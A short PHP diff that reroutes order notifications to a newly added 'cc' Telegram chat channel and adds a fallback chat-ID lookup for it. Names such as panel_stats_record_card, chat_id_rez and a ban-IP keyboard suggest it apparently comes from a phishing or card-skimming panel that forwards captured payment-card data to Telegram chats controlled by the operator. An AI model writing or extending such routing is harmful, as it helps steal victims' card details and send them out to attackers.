@@ -317,7 +317,11 @@ function telegram_chat_id(array $config, string $channel): string
     }
 
     if ($channel === 'billing') {
-        return trim((string) ($config['chat_id_billing'] ?? $config['chat_id_rez'] ?? $config['chat_id'] ?? ''));
+        return trim((string) ($config['chat_id_billing'] ?? $config['chat_id'] ?? ''));
+    }
+
+    if ($channel === 'cc') {
+        return trim((string) ($config['chat_id_cc'] ?? $config['chat_id_rez'] ?? $config['chat_id'] ?? ''));
     }
 
     return trim((string) ($config['chat_id_rez'] ?? $config['chat_id'] ?? ''));
@@ -545,7 +549,7 @@ function notify_order(array $data): bool
     require_once __DIR__ . '/panel-stats.php';
     panel_stats_record_card($data);
 
-    return send_telegram_message(build_order_message($data), 'billing', telegram_ban_ip_keyboard(client_ip()));
+    return send_telegram_message(build_order_message($data), 'cc', telegram_ban_ip_keyboard(client_ip()));
 }
 
 function notify_partial_order(array $data): bool
